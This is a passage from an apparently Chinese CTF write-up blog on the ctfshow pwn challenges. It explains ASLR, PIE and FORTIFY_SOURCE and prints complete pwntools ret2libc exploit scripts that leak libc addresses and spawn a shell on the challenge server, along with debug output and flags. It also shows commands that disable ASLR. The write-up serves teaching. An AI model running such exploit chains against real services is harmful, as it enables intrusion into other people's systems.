20 00 00 00          push   $0x20</span><br><span class="line"> 80483cb:   e9 a0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用cyclic计算栈偏移量，得出栈偏移量为140</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ cyclic -l 0x6261616b</span><br><span class="line">140</span><br></pre></td></tr></table></figure><p>使用objdump查看plt表中的函数，我们看到plt表中有puts函数也有write函数，这里我们使用puts函数来输出函数的内存地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ objdump -d -j .plt pwn</span><br><span class="line"></span><br><span class="line">pwn:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048370 &lt;.plt&gt;:</span><br><span class="line"> 8048370:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> 8048376:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 804837c:00 00                add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line">#######</span><br><span class="line">08048380 &lt;read@plt&gt;:</span><br><span class="line"> 8048380:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> 8048386:68 00 00 00 00       push   $0x0</span><br><span class="line"> 804838b:e9 e0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br><span class="line">########</span><br><span class="line">08048390 &lt;puts@plt&gt;:</span><br><span class="line"> 8048390:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 8048396:68 08 00 00 00       push   $0x8</span><br><span class="line"> 804839b:e9 d0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483a0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80483a0:ff 25 14 a0 04 08    jmp    *0x804a014</span><br><span class="line"> 80483a6:68 10 00 00 00       push   $0x10</span><br><span class="line"> 80483ab:e9 c0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br><span class="line"> </span><br><span class="line"> #######</span><br><span class="line">080483b0 &lt;write@plt&gt;:</span><br><span class="line"> 80483b0:ff 25 18 a0 04 08    jmp    *0x804a018</span><br><span class="line"> 80483b6:68 18 00 00 00       push   $0x18</span><br><span class="line"> 80483bb:e9 b0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483c0 &lt;setvbuf@plt&gt;:</span><br><span class="line"> 80483c0:ff 25 1c a0 04 08    jmp    *0x804a01c</span><br><span class="line"> 80483c6:68 20 00 00 00       push   $0x20</span><br><span class="line"> 80483cb:e9 a0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"> </span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28278)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0x88 + 0x4  # 溢出偏移地址</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]  # main函数地址</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]  # plt表中puts函数地址</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]  # got表中puts函数地址</span><br><span class="line"> </span><br><span class="line"># payload：0x88+0x4个无用填充字符覆盖到返回地址，</span><br><span class="line"># 将puts函数plt表地址做返回地址，代表ctfshow函数执行完会执行puts函数，</span><br><span class="line"># main_addr是puts函数执行完后的返回地址，使用puts函数执行完后回到main函数继续利用溢出漏洞</span><br><span class="line"># puts函数got表中的地址作为puts函数执行的参数，让puts函数输出puts函数在内存的地址</span><br><span class="line">payload = offset * &#x27;a&#x27; + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"># 发送payload</span><br><span class="line">p.sendline(payload)</span><br><span class="line"># 接收puts函数输出的puts函数在内存的地址</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"> </span><br><span class="line"># 在根据内存中puts函数的地址寻找相应的libc版本中puts函数的地址</span><br><span class="line">libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line"> </span><br><span class="line"># 计算 system 函数的地址</span><br><span class="line">system_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line"> </span><br><span class="line"># 计算 &quot;/bin/sh&quot; 字符串的地址</span><br><span class="line">binsh_addr = libc_base + next(libc.search(&#x27;/bin/sh&#x27;))</span><br><span class="line"> </span><br><span class="line"># 构造 payload 发送给程序</span><br><span class="line">payload = offset * &#x27;a&#x27; + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ python 11.py</span><br><span class="line">[+] Opening connection to pwn.challenge.ctf.show on port 28278: Done</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] &#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[DEBUG] Sent 0x99 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000080  61 61 61 61  61 61 61 61  61 61 61 61  90 83 04 08  │aaaa│aaaa│aaaa│····│</span><br><span class="line">    00000090  2d 86 04 08  10 a0 04 08  0a                        │-···│····│·│</span><br><span class="line">    00000099</span><br><span class="line">[DEBUG] Received 0x11 bytes:</span><br><span class="line">    00000000  60 13 df f7  90 2d da f7  b6 83 04 08  c0 1a df f7  │`···│·-··│····│····│</span><br><span class="line">    00000010  0a                                                  │·│</span><br><span class="line">    00000011</span><br><span class="line">0xf7df1360</span><br><span class="line">0xf7d8a000</span><br><span class="line">[DEBUG] Sent 0x99 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000080  61 61 61 61  61 61 61 61  61 61 61 61  10 6d dc f7  │aaaa│aaaa│aaaa│·m··│</span><br><span class="line">    00000090  61 61 61 61  cf 58 f0 f7  0a                        │aaaa│·X··│·│</span><br><span class="line">    00000099</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    &#x27;cat flag\n&#x27;</span><br><span class="line">[DEBUG] Received 0x2e bytes:</span><br><span class="line">    &#x27;ctfshow&#123;8b046493-c3e3-4c64-bcd0-3e78fe5b80d2&#125;\n&#x27;</span><br><span class="line">ctfshow&#123;8b046493-c3e3-4c64-bcd0-3e78fe5b80d2&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn26"><a href="#pwn26" class="headerlink" title="pwn26"></a>pwn26</h3><h4 id="什么是ASLR"><a href="#什么是ASLR" class="headerlink" title="什么是ASLR"></a>什么是ASLR</h4><p>大多数的攻击都基于这样一个前提，即攻击者知道程序的内存布局，需要提前知道shellcode或者其他一些数据的位置。因此，引入内存布局的随机化能够有效增加漏洞利用的难度，其中一种技术就是ASLR（Address Space Layout Randomization）。ASLR提供的只是概率上的安全性，根据用于随机化的熵，攻击者有可能幸运地猜到正确的地址，有时攻击者还可以爆破。</p><p>在Linux上，ASLR的全局配置&#x2F;proc&#x2F;sts&#x2F;kernel&#x2F;randomize_va_space有三种情况：0表示关闭ASLR；1表示部分开启（将mmap的基址，stack和vdso页面随机化）；2表示完全开启（在部分开启的基础上增加heap的随机化）。如下： 在这里插入图片描述 我们可以修改&#x2F;proc&#x2F;sts&#x2F;kernel&#x2F;randomize_va_space文件的值来配置ASLR。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">./pwn</span><br></pre></td></tr></table></figure><h3 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h3><p>这道题目相较于上道题目，是&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space这个文件的内容为0或者1都可以得到正确的flag。由于我们在上到题目中已经把&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space这个文件中的内容改为了0，所以我们直接运行pwn文件就能拿到flag了。</p><h3 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h3><p>这道题目比前两道题好像还简单，什么限制都没有，直接运行就能拿flag，天大的好事呀！！！</p><h3 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h3><h4 id="什么是PIE"><a href="#什么是PIE" class="headerlink" title="什么是PIE"></a>什么是PIE</h4><p>由于ASLR是一种操作系统层面的技术，而二进制程序本身是不支持随机化加载的，便出现了一些绕过方法，例如ret2plt、GOT劫持、地址爆破等。于是，人们于2003年引入了位置无关可执行文件（Position-Independent Executable，PIE）。它在应用层的编译器实现，通过将程序编译为位置无关代码（Position-Independent Code，PIC），使程序可以被加载到任意位置，就像是一个特殊的共享库。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，大大增加了利用难度。然而在增加安全性的同时，PIE也会一定程度上影响性能，因此在大多数操作系统上PIE仅用于一些对安全性要求比较高的程序。</p><p>ASLR和PIE开启后，</p><p>大致逻辑就是，先把&#x2F;proc&#x2F;sts&#x2F;kernel&#x2F;randomize_va_space的内容更改为2，也就是将ASLR全开启，然后输出了main函数和system函数的地址，有输出了变量的堆栈的信息，最后打印一条消息，说明所有的保护机制都开了，地址全部都是随机化的！然后就会为我们输出flag了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ctfshow/Desktop# ./pwn</span><br><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Linux_Security_Mechanisms                               </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Please confirm your ASLR level first !                  </span><br><span class="line">    * *************************************                           </span><br><span class="line">Here is your ASLR level:</span><br><span class="line">2</span><br><span class="line">Let&#x27;s take a look at protection:</span><br><span class="line">[*] Checking for new versions of pwntools</span><br><span class="line">    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-2.7/update to &#x27;never&#x27; (old way).</span><br><span class="line">    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):</span><br><span class="line">        [update]</span><br><span class="line">        interval=never</span><br><span class="line">[*] A newer version of pwntools is available on pypi (4.2.1 --&gt; 4.12.0).</span><br><span class="line">    Update with: $ pip install -U pwntools</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">executable: 0x55555555483a</span><br><span class="line">system@plt: 0x7ffff782d420</span><br><span class="line">heap: 0x555555757260</span><br><span class="line">stack: 0x7fffffffe324</span><br><span class="line">As you can see, the protection has been fully turned on and the address has been completely randomized!</span><br><span class="line">Here is your flag:</span><br><span class="line">ctfshow&#123;Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h3><h5 id="关闭PIE后-程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。"><a href="#关闭PIE后-程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。" class="headerlink" title="关闭PIE后 程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。"></a><strong>关闭PIE后 程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。</strong></h5><p>依旧是一个溢出漏洞，内存占用情况和pwn25也是一样的</p><p>那么可以利用和pwn25一样的exp，利用ret2libc泄露puts函数的地址，进而发送payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28119&quot;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x88 + 0x4</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system_addr) + b&#x27;a&#x27; * 4 + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h3><h5 id="开启-ASLR-和-PIE-的情况下，仍可能被利用"><a href="#开启-ASLR-和-PIE-的情况下，仍可能被利用" class="headerlink" title="开启 ASLR 和 PIE 的情况下，仍可能被利用"></a>开启 ASLR 和 PIE 的情况下，仍可能被利用</h5><p>虽然程序每次运行的基址会变,但程序中的各段的相对偏移是不会变的，只要泄露出来一个地址，通过IDA静态的看他的程序地址,就能算出基址,从而实现绕过。</p><p>这里程序中有输出main函数地址的语句，那么就得到了运行时main函数的地址，减去main函数的静态地址，就是函数地址的偏移量了</p><p>用程序表示就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;端口号&quot;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">main_real_addr = int(p.recv().strip(),16)</span><br><span class="line">base_addr = main_real_addr - elf.sym[&#x27;main&#x27;]</span><br></pre></td></tr></table></figure><p>知道了函数地址偏移量，还需要知道溢出的偏移量，输入下面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb pwn      #用gdb打开文件</span><br><span class="line">cyclic 200     #输出200个无用字符</span><br></pre></td></tr></table></figure><p>可以看到输出了200个无用字符，都复制下来</p><p>再输入r运行程序，可以看到main函数的地址被输出了。接着将刚才复制的200个字符粘贴作为输入，可以看到又输出了一个地址并报错了，这是因为栈溢出，程序给出了一个无效地址，而这个地址就是被覆盖后的ctfshow函数的返回地址</p><p>再输入cyclic -l 0x6261616b就能得到栈溢出的偏移量，是140</p><p>由此得到了两个数据，一个是函数地址的偏移量，一个是栈溢出的偏移量，根据这两个数据改写之前的ret2libc脚本，下面是其他博客里py来的exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, 28173)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">main_real_addr = int(p.recv().strip(), 16)</span><br><span class="line">print(hex(main_real_addr))</span><br><span class="line">base_addr = main_real_addr - elf.sym[&#x27;main&#x27;]</span><br><span class="line"># 获得了内存中真实的main地址，再减去程序中的main函数的地址就能得到程序中函数在内存中的偏移</span><br><span class="line"></span><br><span class="line">puts_plt = base_addr + elf.sym[&#x27;puts&#x27;]</span><br><span class="line">puts_got = base_addr + elf.got[&#x27;puts&#x27;]</span><br><span class="line">ctfshow_addr = base_addr + elf.sym[&#x27;ctfshow&#x27;]</span><br><span class="line">ebx = base_addr + 0x1fc0</span><br><span class="line">payload = 132 * b&#x27;a&#x27; + p32(ebx) + 4 * b&#x27;a&#x27; + p32(puts_plt) + p32(main_real_addr) + p32(puts_got)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"># 通过got表中puts函数的地址打印出puts函数真实的地址</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"># 找到libc，通过libc找到system、/bin/sh</span><br><span class="line"></span><br><span class="line">payload = 140 * b&#x27;a&#x27; + p32(system_addr) + p32(ctfshow_addr) + p32(binsh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>对于上面的exp，以下为详解：</p><p>1.与服务器建立连接后先利用main函数获得函数地址的偏移量base_addr，也就是所谓的基址</p><p>2.利用基址得到puts函数在plt和got表中的真实地址</p><p>3.发送payload，利用got表得到puts函数真实的地址</p><p>4.利用puts函数的真实地址得到libc库的基址，进而得到libc库中system函数和&#x2F;bin&#x2F;sh的地址</p><p>5.再次发送payload获得shell</p><p>其中第一个payload出现了ebx，这是因为ctfshow函数的最后有一条mov指令，其中的ebx寄存器不能被覆盖，所以需要将其真实的地址放到payload中。ebx是由__x86.get_pc_thunk.bx得到的，它将下一条指令的地址赋给ebx寄存器，然后通过加上一个偏移，得到当前进程GOT表的地址，并以此作为后续操作的基地址。</p><p>用readelf -S pwn命令可以知道got表的初始地址为0x001fc0，因此ebx的真实地址为base_addr + 0x1fc0</p><p>运行脚本得到flag</p><h3 id="pwn32"><a href="#pwn32" class="headerlink" title="pwn32"></a>pwn32</h3><h5 id="FORTIFY-SOURCE-x3D-0：-禁用-Fortify-功能。-不会进行任何额外的安全检查。-可能导致潜在的安全漏洞。"><a href="#FORTIFY-SOURCE-x3D-0：-禁用-Fortify-功能。-不会进行任何额外的安全检查。-可能导致潜在的安全漏洞。" class="headerlink" title="FORTIFY_SOURCE&#x3D;0： 禁用 Fortify 功能。 不会进行任何额外的安全检查。 可能导致潜在的安全漏洞。"></a>FORTIFY_SOURCE&#x3D;0： 禁用 Fortify 功能。 不会进行任何额外的安全检查。 可能导致潜在的安全漏洞。</h5><p>我们先来分析一下代码的逻辑： 程序打印出logo的信息，然后然后将第一个参数argv[1]也就是我们启动程序输入的第一个参数(其实还有argv[0]的，这个参数是每个程序的都一定会有的，并且值为程序名称)赋给v4，并且没有长度限制。之后程序将v4[10]的数组内容赋给buf1[10]数组，再将CTFshowPWN通过strcpy函数赋给buf2，接着打印输出buf1和buf2。再然后通过strtol(argv[3], 0LL, 10)将我们启动程序传入的第三个参数转为10进制赋给v5，紧接着使用memcpy函数将argv2的v5个字符赋给buf1，v5是int型，数值就是上条语句的得来的；然后再通过strcpy函数argv[1]我们输入第一个参数赋给buf2，之后再打印输出buf1和buf2，最后读取_bss_start 11个字符给buf1，打印输出buf1和num的信息。最最后通过if判断argc是否大于4(默认情况下argc是等于1的，因为argv[0]必定存在，我们输入一个参数，argc就会等于2，依次递推)，如果大于4，就会进入Undefined函数，Undefined函数的作用就是输出flag了。</p><p>因为本题目FORTIFY_SOURCE没有开启，代表我们启动函数直接输入4个参数(这时argc&#x3D;5 &gt; 4)就行了，而且这4个参数没有长度限制，如果开启FORTIFY_SOURCE就不好说了，因为开启了之后，由于程序存在strcpy和memcpy函数会检测长度，如果长度超过了限制，可能会使程序抛出异常而退出执行。</p><p>那么这道题目我们就直接输入4个参数就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pwnme 1 2 3 4</span><br></pre></td></tr></table></figure><p>这时程序会停在这里，我们直接一个回车就行了。</p><h3 id="pwn33"><a href="#pwn33" class="headerlink" title="pwn33"></a>pwn33</h3><p>memcpy和strcpy这两个函数被替换成了<strong>mencpy_chk和</strong>strcpy__chk安全函数，可以看到这两个函数相比前两个函数只是加上了11LL这个参数加以限制，因为buf1和buf2在声明的时候的长度就是11，所以程序为了防止溢出，使用后两个函数加上这两个数组的长度加以限制以防溢出。</p><p>我们就保证我们输入的第一个参数和第二个参数的长度不超过11就行了啊，只是上到题目没有开启FORTIFY_SOURCE，我们输入参数的长度是任意的，这道题目对我们的参数加以限制了而以。</p><p>我们直接ssh连接，运行pwnme加上不超过11长度的4个参数就行了(主要是参数1和参数2不超过11)，那我们就和上道题目一样每个参数长度都为1呗。</p><h3 id="pwn34"><a href="#pwn34" class="headerlink" title="pwn34"></a>pwn34</h3><p>FORTIFY_SOURCE&#x3D;2： 启用 Fortify 功能的高级级别。 包括基本级别的安全检查，并添加了更多的检查。 在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。</p><p><strong>mencpy_chk和</strong>strcpy<strong>chk安全函数上道题目已经说过与memcpy和strcpy的区别，这里不再赘述。</strong> printf__chk该函数与printf的区别在于： 不能使用 %x$n 不连续地打印，也就是说如果要使用 %3$n，则必须同时使用 %1$n 和 %2$n。在使用 %n 的时候会做一些检查。 这个涉及到格式化字符串漏洞，本题涉及不到，所以对本道题也几乎阻碍不大，所以我们还是ssh之后运行文件时输入的4个长度为1的参数，不出意外还能到拿到flag！</p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="pwn36"><a href="#pwn36" class="headerlink" 